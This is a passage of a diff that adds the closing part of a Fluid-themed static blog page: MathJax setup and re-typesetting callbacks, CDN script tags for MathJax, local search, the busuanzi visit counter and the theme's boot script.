+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
